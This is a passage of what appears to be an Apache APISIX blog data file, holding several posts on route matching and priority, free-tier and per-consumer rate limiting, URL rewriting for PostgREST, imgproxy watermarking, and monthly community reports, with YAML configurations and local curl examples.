matching\\n\\nAPISIX delegates its matching rule to a [router](https://apisix.apache.org/docs/apisix/terminology/router/).\\nStandard matching parameters include:\\n\\n* The URI\\n* The HTTP method. By default, all methods match.\\n* The host\\n* The remote address\\n\\nMost users do match on the URI; a small minority use HTTP methods and the host. However, they are not the only matching parameters. Knowing the rest will bring you into the world of advanced users of APISIX.\\n\\nLet\'s take a simple example, header-based API versioning. You\'d need actually to match a specific HTTP request header. I\'ve already described how to do it [previously](https://blog.frankel.ch/api-versioning/). In essence, `vars` is an additional matching criterion that allows the evaluation of APISIX and nginx variables.\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream_id: 1\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v1+json\\" ]]\\n```\\n\\nThe above route will match if, and only if, the HTTP `Accept` header is equal to `vnd.ch.frankel.myservice.v1+json`. You can find the complete list of supported operators in the [lua-resty-expr](https://github.com/api7/lua-resty-expr) project.\\n\\nAPISIX matches routes in a non-specified order by default. If URIs are _disjointed_, that\'s not an issue.\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream_id: 1\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v1+json\\" ]]\\n  - uri: /*\\n    upstream_id: 2\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v2+json\\" ]]\\n```\\n\\nProblems arise when URIs are somehow not disjointed. For example, imagine I want to set a default route for unversioned calls.\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream_id: 1\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v1+json\\" ]]\\n  - uri: /*\\n    upstream_id: 2\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v2+json\\" ]]\\n  - uri: /*\\n    upstream_id: 1\\n```\\n\\nWe need the third route to be evaluated last. If it\'s evaluated first, it will match all requests, regardless of their HTTP headers. APISIX offers the `priority` parameter to order route evaluation. By default, a route\'s priority is 0. Let\'s use `priority` to implement the versioning correctly:\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream_id: 1\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v1+json\\" ]]\\n    priority: 10                                              #1\\n  - uri: /*\\n    upstream_id: 2\\n    vars: [[ \\"http_accept\\", \\"==\\", \\"vnd.ch.frankel.myservice.v2+json\\" ]]\\n    priority: 10                                              #1\\n  - uri: /*\\n    upstream_id: 1\\n```\\n\\n1. Evaluated first. The order is not relevant since the URIs are disjointed.\\n\\n## Implementing free tier with matching rules\\n\\nWe are now ready to implement our free tier with matching rules.\\n\\nThe first route to be evaluated should be the one with authentication and no rate limit:\\n\\n```yaml\\nroutes:\\n  - uri: /get\\n    upstream_id: 1\\n    vars: [[ \\"http_apikey\\", \\"~~\\", \\".*\\"]]                      #1\\n    plugins:\\n      key-auth: ~                                             #2\\n    priority: 10                                              #3\\n```\\n\\n1. Match if the request has an HTTP header named `apikey`\\n2. Authenticate the request\\n3. Evaluate first\\n\\nThe other route is evaluated afterward.\\n\\n```yaml\\n  - uri: /get\\n    upstream_id: 1\\n    plugins:\\n      limit-count:                                            #1\\n        count: 1\\n        time_window: 60\\n        rejected_code: 429\\n```\\n\\n1. Rate limit this route\\n\\nWhen you configure APISIX with the above snippets, and it receives a request to `/get`, it tries to match the first route *only* if it has an `apikey` request header:\\n\\n1. If it has one:\\n    * The `key-auth` plugin kicks in\\n    * If it succeeds, APISIX forwars the request to the upstream\\n    * If it fails, APISIX returns a 403 HTTP status code\\n2. If it has no such request header, it matches the second route with a rate limit.\\n\\n## Conclusion\\n\\nA free tier is a must for any API service provider worth its salt. In this post, I\'ve explained how to configure such free tier with Apache APISIX.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/free-tier-apisix).\\n\\n**To go further:**\\n\\n* [Consumer](https://apisix.apache.org/docs/apisix/terminology/consumer/)\\n* [limit-count plugin](https://apisix.apache.org/docs/apisix/plugins/limit-count/)\\n* [router-radixtree](https://apisix.apache.org/docs/apisix/router-radixtree/)\\n* [lua-resty-expr](https://github.com/api7/lua-resty-expr)"},{"id":"Monthly Report (July 01 - July 31)","metadata":{"permalink":"/blog/2024/07/31/monthly-report","source":"@site/blog/2024/07/31/monthly-report.md","title":"Monthly Report (July 01 - July 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-07-31T00:00:00.000Z","formattedDate":"July 31, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.825,"truncated":true,"authors":[],"prevItem":{"title":"Free tier API with Apache APISIX","permalink":"/blog/2024/08/01/free-tier-api-apisix"},"nextItem":{"title":"Differentiating rate limits in Apache APISIX","permalink":"/blog/2024/07/25/different-rate-limits-apisix"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The main improvement is moving the default values from `config-default.yaml` to a hardcoded Lua file. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom July 1 to June 31, a total of 13 contributors made 21 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/07/31/Uk3y8OVm_july-contributors.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/07/31/x59QmPpL_new-contributors-july.png)\\n\\n## Recent Feature Highlight\\n\\n- [Move `config-default.yaml` default values to hardcoded Lua file](https://github.com/apache/apisix/pull/11312)\uff08Contributor: [bzp2010](https://github.com/bzp2010))\\n\\n  Apache APISIX has two configuration files: `config.yaml` which can be modified by users and `config-default.yaml`, the default configuration file. When APISIX starts, it reads these two configuration files and merges and overwrites the user configuration file with the default configuration to create the configuration that is used at runtime.\\n  \\n  However, in actual use, users are often unclear on how to modify custom configurations. To simplify the configuration process and avoid unintended issues from modifying the default file, we moved the default configuration values to a hardcoded Lua file. This allows users to focus on customizing the `config.yaml` file without the risk of accidentally changing the default settings.\\n\\n## Recent Blog Recommendations\\n\\n- [Advanced URL rewriting with Apache APISIX](https://apisix.apache.org/blog/2024/07/18/advanced-url-rewrite-apisix/)\\n  \\n  Explore how to leverage Apache APISIX\'s [`proxy-rewrite`](https://apisix.apache.org/docs/apisix/plugins/proxy-rewrite/) and [`serverless`](https://apisix.apache.org/docs/apisix/plugins/serverless/) plugins to achieve advanced URL rewriting, simplify API design, and boost development efficiency.\\n\\n- [Dynamic watermarking with imgproxy and Apache APISIX](https://apisix.apache.org/blog/2024/07/11/watermarking-infrastructure/)\\n  \\n  Discover how to leverage the power of Apache APISIX and [imgproxy](https://docs.imgproxy.net/features/watermark) to implement dynamic watermarking and on-the-fly image processing for your web applications.\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Differentiating rate limits in Apache APISIX","metadata":{"permalink":"/blog/2024/07/25/different-rate-limits-apisix","source":"@site/blog/2024/07/25/different-rate-limits-apisix.md","title":"Differentiating rate limits in Apache APISIX","description":"In my talk Evolving your APIs, I mention that an API Gateways is a Reverse Proxy \\"on steroids\\". One key difference between the former and the latter is that the API Gateway is not unfriendly to business logic. The poster child is rate-limiting.\\n","date":"2024-07-25T00:00:00.000Z","formattedDate":"July 25, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.12,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Monthly Report (July 01 - July 31)","permalink":"/blog/2024/07/31/monthly-report"},"nextItem":{"title":"Advanced URL rewriting with Apache APISIX","permalink":"/blog/2024/07/18/advanced-url-rewrite-apisix"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/different-rate-limits-apisix/\\" />\\n</head>\\n\\n>In my talk Evolving your APIs, I mention that an API Gateway is a Reverse Proxy \\"on steroids\\". One key difference between the former and the latter is that the API Gateway is not unfriendly to business logic. The poster child is rate-limiting.\\n\\n\x3c!--truncate--\x3e\\n\\nRate-limiting is an age-old Reverse Proxy feature focused on protecting against <abbr title=\\"Distributed Denial of Service\\">DDoS</abbr> attacks. It treats all clients the same and is purely technical. In this day and age, most API providers offer different subscription tiers; the higher the tier, the higher the rate limit, and the more you pay incidentally. It\'s not technical anymore and requires to differentiate between clients.\\n\\nIn this post, I want to detail how to do it with Apache APISIX. Note I take most of the material from the [workshop](https://nfrankel.github.io/apisix-workshop/).\\n\\n## Rate-limiting for the masses\\n\\nApache APISIX offers no less than three plugins to rate limit requests:\\n\\n* [limit conn](https://apisix.apache.org/docs/apisix/plugins/limit-conn/): limits the number of concurrent requests\\n* [limit req](https://https://apisix.apache.org/docs/apisix/plugins/limit-req/): limits the number of requests based on the [Leaky Bucket](https://en.wikipedia.org/wiki/Leaky_bucket) algorithm\\n* [limit count](https://https://apisix.apache.org/docs/apisix/plugins/limit-count/): limits the number of requests based on a fixed time window\\n\\nThe `limit-count` plugin is a good candidate for this post.\\n\\nLet\'s configure the plugin for a route:\\n\\n```yaml\\nroutes:\\n  - uri: /get\\n    upstream:\\n      nodes:\\n        \\"http://httpbin.org:80\\": 1\\n    plugins:\\n      limit-count:                     #1\\n        count: 1                       #2\\n        time_window: 60                #2\\n        rejected_code: 429             #3\\n#END\\n```\\n\\n1. Set the `limit-count` plugin\\n2. Limit requests to one every 60 seconds\\n3. Override the default HTTP response code, _i.e._, `503`\\n\\nAt this point, we configured regular rate limiting.\\n\\n```bash\\ncurl -v http://localhost:9080/get\\ncurl -v http://localhost:9080/get\\n```\\n\\nIf we execute the second request before a minute has passed, the result is the following:\\n\\n```http\\nHTTP/1.1 429 Too Many Requests\\nDate: Tue, 09 Jul 2024 06:55:07 GMT\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 241\\nConnection: keep-alive\\nX-RateLimit-Limit: 1                   #1\\nX-RateLimit-Remaining: 0               #2\\nX-RateLimit-Reset: 59                  #3\\nServer: APISIX/3.9.1\\n\\n<html>\\n<head><title>429 Too Many Requests</title></head>\\n<body>\\n<center><h1>429 Too Many Requests</h1></center>\\n<hr><center>openresty</center>\\n<p><em>Powered by <a href=\\"https://apisix.apache.org/\\">APISIX</a>.</em></p></body>\\n</html>\\n```\\n\\n1. Configured limit\\n2. Remaining quota\\n3. Waiting time in seconds before quota replenishment\\n\\n## Per-consumer rate limiting\\n\\nTo configure per-consumer rate limiting, we first need to implement request authentication. APISIX offers many authentication plugins; we shall use the simplest one, [`key-auth`](https://apisix.apache.org/docs/apisix/plugins/key-auth/). `key-auth` checks a specific HTTP request header - `apikey` by default.\\n\\nHere\'s how we configure consumers:\\n\\n```yaml\\nconsumers:\\n  - username: johndoe                  #1\\n    plugins:\\n      key-auth:\\n        key: john                      #2\\n  - username: janedoe                  #1\\n    plugins:\\n      key-auth:\\n        key: jane                      #2\\n```\\n\\n1. Users\\n2. HTTP header request value\\n\\n```bash\\ncurl -H \'apikey: john\' localhost:9080/get #1\\ncurl -H \'apikey: jane\' localhost:9080/get #2\\n```\\n\\n1. Authenticate as `johndoe`\\n2. Authenticate as `janedoe`\\n\\nIn general, you attach plugins to APISIX routes but can also attach them to consumers. We can now move the `limit-count` plugin.\\n\\n```yaml\\nroutes:\\n  - uri: /get\\n    upstream:\\n      nodes:\\n        \\"httpbin:80\\": 1\\n    plugins:\\n      key-auth: ~                      #1\\n\\nconsumers:\\n  - username: johndoe\\n    plugins:\\n      key-auth:\\n        key: john\\n      limit-count:\\n        count: 1                       #2\\n        time_window: 60\\n        rejected_code: 429\\n  - username: janedoe\\n    plugins:\\n      key-auth:\\n        key: jane\\n      limit-count:\\n        count: 5                       #2\\n        time_window: 60\\n        rejected_code: 429\\n#END\\n```\\n\\n1. The route is only accessible to requests authenticating with `key-auth`\\n2. `johndoe` has a lower limit count than `janedoe`. Did he forget to pay his subscription fees?\\n\\n```bash\\ncurl -H \'apikey: john\' localhost:9080/get\\ncurl -H \'apikey: john\' localhost:9080/get\\ncurl -H \'apikey: jane\' localhost:9080/get\\ncurl -H \'apikey: jane\' localhost:9080/get\\n```\\n\\nThe second request gets rate-limited.\\n\\n## Per-group rate limiting\\n\\nWe never attach permissions directly to identities in Identity Management systems. It\'s considered bad practice because when a person moves around the organization, we need to add and remove permissions one by one. The good practice is to attach permissions to groups and set the person in that group. When the person moves, we change their group; the person loses permissions from the old group and gets permissions from the new group. People get their permissions _transitively_ via their groups.\\n\\nApache APISIX offers an abstraction called a `Consumer Group` for this.\\n\\nLet\'s create two consumer groups with different rate limit values:\\n\\n```yaml\\nconsumer_groups:\\n  - id: 1\\n    plugins:\\n      limit-count:\\n        count: 1\\n        time_window: 60\\n        rejected_code: 429\\n  - id: 2\\n    plugins:\\n      limit-count:\\n        count: 5\\n        time_window: 60\\n        rejected_code: 429\\n```\\n\\nThe next step is to attach consumers to these groups:\\n\\n```yaml\\nconsumers:\\n  - username: johndoe\\n    group_id: 1\\n    plugins:\\n      key-auth:\\n        key: john\\n  - username: janedoe\\n    group_id: 2\\n    plugins:\\n      key-auth:\\n        key: jane\\n```\\n\\n```bash\\ncurl -H \'apikey: john\' localhost:9080/get\\ncurl -H \'apikey: john\' localhost:9080/get\\ncurl -H \'apikey: jane\' localhost:9080/get\\ncurl -H \'apikey: jane\' localhost:9080/get\\n```\\n\\nThe second request gets rate-limited.\\n\\nWe have the same results as before with two benefits. The first one is as I wrote above: when consumers move in and out, they change their permissions accordingly.\\n\\nThe second benefit is that the limit count is shared among all consumers of a group.  Indeed, when you set a limit, you don\'t want each consumer to be rate limited at X requests per Y second; you want the group as a whole to share the limit. In this way, if a single consumer is very active, they will naturally cap the rate of other consumers who share the same group.\\n\\nOf course, you can set a limit on both a consumer and the group it belongs to. In this case, the lowest limit will apply first.\\n\\n```yaml\\nconsumers:\\n  - username: johndoe\\n    group_id: 2                        #1\\n    plugins:\\n      key-auth:\\n        key: john\\n      limit-count:\\n        count: 1                       #2\\n        time_window: 60\\n        rejected_code: 429\\n  - username: janedoe\\n    group_id: 2\\n    plugins:\\n      key-auth:\\n        key: jane\\n```\\n\\n1. Move `johndoe` to group 2\\n2. Limit him individually\\n\\n```bash\\ncurl -H \'apikey: john\' localhost:9080/get\\ncurl -H \'apikey: john\' localhost:9080/get #1\\n```\\n\\n1. `johndoe` hits the limit here, but `janedoe` now only has four requests left from this minute, as the former used one request\\n\\n## Conclusion\\n\\nIn this post, we implement rate limiting with Apache APISIX. We set the rate limit on a route and moved it to individual consumers. Then we moved it to consumer groups, so all consumers in a group share the same \\"pool\\".\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/rate-limit-apisix).\\n\\n**To go further:**\\n\\n* [Consumer](https://apisix.apache.org/docs/apisix/terminology/consumer/)\\n* [Consumer Group](https://apisix.apache.org/docs/apisix/terminology/consumer-group/)\\n* [Apache APISIX Hands-on Lab](https://nfrankel.github.io/apisix-workshop/)"},{"id":"Advanced URL rewriting with Apache APISIX","metadata":{"permalink":"/blog/2024/07/18/advanced-url-rewrite-apisix","source":"@site/blog/2024/07/18/advanced-url-rewrite-apisix.md","title":"Advanced URL rewriting with Apache APISIX","description":"I spoke at Swiss PgDay in Switzerland in late June. The talk was about how to create a no-code API with the famous PostgreSQL database, the related PostgREST, and Apache APISIX, of course. I already wrote about the idea in a previous post. However, I wanted to improve it, if only slightly. PostgREST offers a powerful `SELECT` mechanism. To list all entities with a column equal to a value, you need the following command: curl /products?id=eq.1.\\n","date":"2024-07-18T00:00:00.000Z","formattedDate":"July 18, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":2.295,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Differentiating rate limits in Apache APISIX","permalink":"/blog/2024/07/25/different-rate-limits-apisix"},"nextItem":{"title":"Dynamic watermarking with imgproxy and Apache APISIX","permalink":"/blog/2024/07/11/watermarking-infrastructure"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/advanced-url-rewrite-apisix/\\" />\\n</head>\\n\\n>I spoke at [Swiss PgDay](https://www.pgday.ch/2024/#schedule) in Switzerland in late June. The talk was about how to create a no-code API with the famous [PostgreSQL](https://www.postgresql.org/) database, the related [PostgREST](https://postgrest.org/), and [Apache APISIX](https://apisix.apache.org), of course. I already wrote about the idea in a [previous post](https://blog.frankel.ch/poor-man-api/). However, I wanted to improve it, if only slightly.\\n>\\n>PostgREST offers a powerful `SELECT` mechanism. To list all entities with a column equal to a value, you need the following command:\\n\\n\x3c!--truncate--\x3e\\n\\n```bash\\ncurl /products?id=eq.1\\n```\\n\\n1. `id` is the column\\n2. `eq.1` corresponds to the `WHERE` clause\\n\\nIn this case, the generated query is `SELECT * FROM products WHERE id=1`.\\n\\nThe [query syntax](https://postgrest.org/en/v12/references/api/tables_views.html#get-and-head) is powerful and allows you to express complex queries. However, as an API designer, I want to avoid exposing users to this complexity. For example, a regular API can manage entities by their ID, _e.g._, `/products/1`. In turn, you\'d expect PostgREST to be able to do the same with primary keys. Unfortunately, it doesn\'t treat primary keys any differently than regular columns. Apache APISIX to the rescue.\\n\\nOne of APISIX\'s best features is to rewrite requests, _i.e._, exposing `/products/1` and forwarding `/products?id=eq.1` to PostgREST. Let\'s do it.\\n\\nFirst, we need to capture the ID of the path parameter. For this, we need to replace the regular radix tree router with the radix tree with a parameter router.\\n\\n```yaml\\napisix:\\n    router:\\n        http: radixtree_uri_with_parameter\\n```\\n\\nThe next step is to rewrite the URL. We use the [proxy-rewrite](https://apisix.apache.org/docs/apisix/plugins/proxy-rewrite/) plugin for this on a `/products/:id` route. Unfortunately, using the `:id` parameter above in the regular expression is impossible. We need to copy it to a place that is accessible. To do that, before the rewriting, we can leverage the [serverless-pre-function](https://apisix.apache.org/docs/apisix/plugins/serverless/). With the plugin, you can write Lua code directly. It\'s an excellent alternative to a full-fledged plugin for short, straightforward snippets.\\n\\nHere\'s the configuration:\\n\\n```bash\\ncurl -i http://localhost:9180/apisix/admin/plugin_configs/1 -X PUT -d \'\\n{\\n  \\"plugins\\": {\\n    \\"serverless-pre-function\\": {\\n      \\"phase\\": \\"rewrite\\",\\n      \\"functions\\" : [\\n        \\"return function(_, ctx)\\n          ctx.var.product_id = ctx.curr_req_matched.id;         #1\\n        end\\"\\n      ]\\n    },\\n    \\"proxy-rewrite\\": {\\n      \\"uri\\": \\"/products?id=eq.$product_id\\"                      #2\\n    }\\n  }\\n}\'\\n```\\n\\n1. Copy the captured `id` variable to a place accessible to other plugins later on\\n2. Use it!\\n\\nThanks to my colleague [Zeping](https://github.com/bzp2010) for pointing out the solution to me!\\n\\nYou can expose the `/products/1` REST-friendly URL and let APISIX rewrite it for PostgREST.\\n\\n## Conclusion\\n\\nI\'ve described using the `proxy-rewrite` plugin with a path variable in this post. You can reuse the same technique with multiple variables. Keep also in mind that the `serverless` plugin is a hidden jewel; it can help you with small Lua snippets before moving to a full-fledged plugin.\\n\\n**To go further:**\\n\\n* [PostgREST](https://postgrest.org/en/v12/references)\\n* [PostgREST tables and views](https://postgrest.org/en/v12/references/api/tables_views.html)\\n* [APISIX serverless plugin](https://apisix.apache.org/docs/apisix/plugins/serverless/)"},{"id":"Dynamic watermarking with imgproxy and Apache APISIX","metadata":{"permalink":"/blog/2024/07/11/watermarking-infrastructure","source":"@site/blog/2024/07/11/watermarking-infrastructure.md","title":"Dynamic watermarking with imgproxy and Apache APISIX","description":"Last week, I described how to add a dynamic watermark to your images on the JVM. I didn\'t find any library, so I had to develop the feature, or, more precisely, an embryo of a feature, by myself. Depending on your tech stack, you must search for an existing library or roll up your sleeves. For example, Rust offers such an out-of-the-box library. Worse, this approach might be impossible to implement if you don\'t have access to the source image. Another alternative is to use ready-made components, namely imgproxy and Apache APISIX. I already combined them to resize images on-the-fly.\\n","date":"2024-07-11T00:00:00.000Z","formattedDate":"July 11, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":1.685,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Advanced URL rewriting with Apache APISIX","permalink":"/blog/2024/07/18/advanced-url-rewrite-apisix"},"nextItem":{"title":"Monthly Report (June 01 - June 30)","permalink":"/blog/2024/06/30/monthly-report"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/dynamic-watermarking/2/\\" />\\n</head>\\n\\n>Last week, I described [how to add a dynamic watermark to your images on the JVM](https://blog.frankel.ch/dynamic-watermarking/1/). I didn\'t find any library, so I had to develop the feature, or, more precisely, an embryo of a feature, by myself. Depending on your tech stack, you must search for an existing library or roll up your sleeves. For example, Rust offers such an out-of-the-box library. Worse, this approach might be impossible to implement if you don\'t have access to the source image.\\n>\\n>Another alternative is to use ready-made components, namely [imgproxy](https://imgproxy.net/) and [Apache APISIX](https://apisix.apache.org/). I already combined them to [resize images on-the-fly](https://blog.frankel.ch/resize-images-on-the-fly/).\\n\\n\x3c!--truncate--\x3e\\n\\nHere\'s the general sequence flow of the process:\\n\\n![Watermark sequence diagram](https://static.apiseven.com/uploads/2024/07/04/E1AzirzN_watermark_sequence_diagram.png)\\n\\n* When APISIX receives a specific pattern, it calls `imgproxy` with the relevant parameters\\n* `imgproxy` fetches the original image and the watermark to apply\\n* It watermarks the original image and returns the result to APISIX\\n\\nLet\'s say the pattern is `/watermark/*`.\\n\\nWe can define two routes:\\n\\n```yaml\\nroutes:\\n  - uri: \\"*\\"                                                                     #1\\n    upstream:\\n      nodes:\\n        \\"server:3000\\": 1\\n  - uri: /watermark/*                                                            #2\\n    plugins:\\n      proxy-rewrite:                                                             #3\\n        regex_uri:\\n          - /watermark/(.*)\\n          - /dummy_sig/watermark:0.8:nowe:20:20:0.2/plain/http://server:3000/$1  #4\\n    upstream:\\n      nodes:\\n        \\"imgproxy:8080\\": 1                                                       #5\\n```\\n\\n1. Catch-all route that forwards to the web server\\n2. Watermark images route\\n3. Rewrite the URL...\\n4. ...with an `imgproxy`-configured route and...\\n5. ...forward to `imageproxy`\\n\\nYou can find the exact rewritten URL syntax in [imgproxy](https://docs.imgproxy.net/features/watermark) documentation. The watermark itself is configured via a single environment variable. You should buy `imgproxy`\'s Pro version if you need different watermarks. As a poor man\'s alternative, you could also set up different instances, each with its watermark, and configure APISIX to route the request to the desired instance.\\n\\nIn this post, we implemented a watermarking feature with the help of `imgproxy`. The more I think about it, the more I think they make a match made in Heaven.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/watermark-on-the-fly).\\n\\n**To go further:**\\n\\n* [Digital watermarking](https://en.wikipedia.org/wiki/Digital_watermarking)\\n* [imgproxy documentation](https://docs.imgproxy.net/)\\n* [imgproxy interactive demo](https://imgproxy.net/)"},{"id":"Monthly Report (June 01 - June 30)","metadata":{"permalink":"/blog/2024/06/30/monthly-report","source":"@site/blog/2024/06/30/monthly-report.md","title":"Monthly Report (June 01 - June 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-06-30T00:00:00.000Z","formattedDate":"June 30, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.13,"truncated":true,"authors":[],"prevItem":{"title":"Dynamic watermarking with imgproxy and Apache APISIX","permalink":"/blog/2024/07/11/watermarking-infrastructure"},"nextItem":{"title":"Random and fixed routes with Apache APISIX","permalink":"/blog/2024/06/13/fixed-routes-apisix"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. These include replacing YAML parser tinyyaml with lyaml, and supporting storing certificates and private keys on SSL through Secret Manager. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom June 1 to June 30, a total of 13 contributors made 22 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/07/01/qMf8xVMY_june-contributors.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/06/28/8fZIturi_new-contributors-june.png)\\n\\n## Recent Feature Highlights\\n\\n- [Replace YAML parser `tinyyaml` with `lyaml`](https://github.com/apache/apisix/pull/11312)\uff08Contributor: [bzp2010](https://github.com/bzp2010))\\n\\n- [Support storing certificates and private keys on SSL through Secret Manager](https://github.com/apache/apisix/pull/11339)\uff08Contributor: [AlinsRan](https://github.com/AlinsRan))\\n\\n## Recent Blog Recommendations\\n\\n- [Random and fixed routes with Apache APISIX](https://apisix.apache.org/blog/2024/06/13/fixed-routes-apisix/)\\n\\n- [Even more OpenTelemetry!](https://apisix.apache.org/blog/2024/06/06/even-more-opentelemetry/)\\n\\nThe official website and GitHub Issues of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Random and fixed routes with Apache APISIX","metadata":{"permalink":"/blog/2024/06/13/fixed-routes-apisix","source":"@site/blog/2024/06/13/fixed-routes-apisix.md","title":"Random and fixed routes with Apache APISIX","description":"My ideas for blog posts inevitably start to dry up after over two years at Apache APISIX. Hence, I did some triage on the [APISIX repo](https://github.com/apache/apisix/issues). I stumbled upon this one question.\\n","date":"2024-06-13T00:00:00.000Z","formattedDate":"June 13, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.52,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Monthly Report (June 01 - June 30)","permalink":"/blog/2024/06/30/monthly-report"},"nextItem":{"title":"Even more OpenTelemetry!","permalink":"/blog/2024/06/06/even-more-opentelemetry"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/fixed-routes-apisix/\\" />\\n</head>\\n\\n>My ideas for blog posts inevitably start to dry up after over two years at [Apache APISIX](https://apisix.apache.org/). Hence, I did some triage on the [APISIX repo](https://github.com/apache/apisix/issues). I stumbled upon this one question:\\n\\n\x3c!--truncate--\x3e\\n\\n>We have a requirement to use a plugin, where we need to route the traffic on percentage basis. I\'ll give an example for better understanding.\\n>\\n>We have an URL <https://xyz.com/ca/fr/index.html> where ca is country (canada) and fr is french language. Now the traffic needs to routed 10% to <https://xyz.com/ca/en/index.html> and the remaining 90% to <https://xyz.com/ca/fr/index.html>. And whenever we\'re routing the traffic to <https://xyz.com/ca/en/index.html> we need to set a cookie. So for next call, if the cookie is there, it should directly go to <https://xyz.com/ca/en/index.html> else it should go via a 10:90 traffic split. What is the best possible way to achieve this ??\\n>\\n>-- [help request: Setting cookie based on a condition](https://github.com/apache/apisix/issues/11279)\\n\\nThe use case is interesting, and I decided to tackle it.\\n\\nI\'ll rephrase the requirements first:\\n\\n* If no cookie is set, randomly forward the request to one of the upstreams\\n* If a cookie has been set, forward the request to the correct upstream.\\n\\nFor easier testing:\\n\\n* I change the odds from 10:90 to 50:50\\n* I use the root instead of a host plus a path\\n\\nFinally, I assume that the upstream sets the cookie.\\n\\nNewcomers to Apache APISIX understand the matching algorithm very quickly: if a request matches a route\'s host, method, and path, forward it to the upstream set.\\n\\n```yaml\\nroutes:\\n  - id: 1\\n    uri: /hello\\n    host: foo.com\\n    methods:\\n      - GET\\n      - PUT\\n      - POST\\n    upstream_id: 1\\n```\\n\\n```bash\\ncurl --resolve foo.com:127.0.0.1 http://foo.com/hello            #1\\ncurl -X POST --resolve foo.com:127.0.0.1 http://foo.com/hello    #2\\ncurl -X PUT --resolve foo.com:127.0.0.1 http://foo.com/hello     #2\\ncurl --resolve bar.com:127.0.0.1 http://bar.com/hello            #3\\ncurl --resolve foo.com:127.0.0.1 http://foo.com/hello/john       #4\\n```\\n\\n1. Matches host, method as `curl` defaults to `GET`, and path\\n2. Matches host, method, and path\\n3. Doesn\'t match host\\n4. Doesn\'t match path as the configured path doesn\'t hold a `*` character\\n\\n`path` is the only required parameter; neither `host` nor `methods` are. `host` defaults to any host and `methods` to any method.\\n\\nBeyond these three main widespread matching parameters, others are available, _e.g._, `remote_addrs` or `vars`. Let\'s focus on the latter. The documentation on the Route API is pretty concise:\\n\\n>Matches based on the specified variables consistent with variables in Nginx. Takes the form `[[var, operator, val], [var, operator, val], ...]]`. Note that this is case sensitive when matching a cookie name. See 